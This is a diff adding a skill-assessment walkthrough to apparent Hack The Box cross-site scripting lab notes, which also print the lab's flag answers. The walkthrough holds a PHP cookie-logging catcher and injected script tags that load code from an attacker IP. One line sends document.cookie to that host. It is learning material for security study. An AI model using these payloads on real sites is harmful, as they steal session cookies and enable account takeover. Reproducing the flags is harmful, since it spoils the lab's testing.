@@ -12,6 +12,7 @@
 2. [XSS Attacks](#xss-attacks)
     1. [Phishing](#phishing)
     2. [Session Hijacking](#session-hijacking)
+3. [Skill Assesment](#skill-assesment)
 
 ## Tools
 ### XSS Scanner
@@ -180,3 +181,52 @@
     ![alt text](<Assets/Session Hijacking - 3.png>)
 
     Once we refresh, we will get the flag. The answer is `HTB{4lw4y5_53cur3_y0ur_c00k135}`.
+
+## Skill Assesment
+1. What is the value of the 'flag' cookie?
+
+    First, we need to host index.php, it will catch the vuln field.
+
+     ```php
+    <?php
+    if (isset($_GET['c'])) {
+        $list = explode(";", $_GET['c']);
+        foreach ($list as $key => $value) {
+            $cookie = urldecode($value);
+            $file = fopen("cookies.txt", "a+");
+            fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+            fclose($file);
+        }
+    }
+    ?>
+    ```
+    Here the setup step:
+
+    ```bash
+    mkdir /tmp/tmpserver
+    cd /tmp/tmpserver
+    vi index.php #at this step we wrote our index.php file
+    sudo php -S 0.0.0.0:8080
+    ```
+
+    We can go to **/assessment** endpoint and doing some exploration. We will find **search** and **comment** input field. I have tested the **search** input field with some payloads but it didnt work. So i moved to **comment** input field. The **name** and **email** section need a valid value, so i avoid doing XSS on it. We can test **comment** and **website** section, here the working payload:
+
+    ```js
+    '><script src=http://10.10.14.144:8080/comment></script>
+    '><script src=http://10.10.14.144:8080/website></script>
+    ```
+    ![alt text](<Assets/Skill Assesment - 1.png>)
+
+    We can see that the **website** section is vuln to XSS. Now, we can setup the script.js.
+
+    ```js
+    new Image().src='http://10.10.14.144:8080/index.php?c='+document.cookie
+    ```
+    Then, we can use this payload:
+
+    ```js
+    '><script src="http://10.10.14.144:8080/script.js"></script>
+    ```
+    ![alt text](<Assets/Skill Assesment - 2.png>)
+
+    Then answer is **HTB{cr055_5173_5cr1p71n6_n1nj4}**.
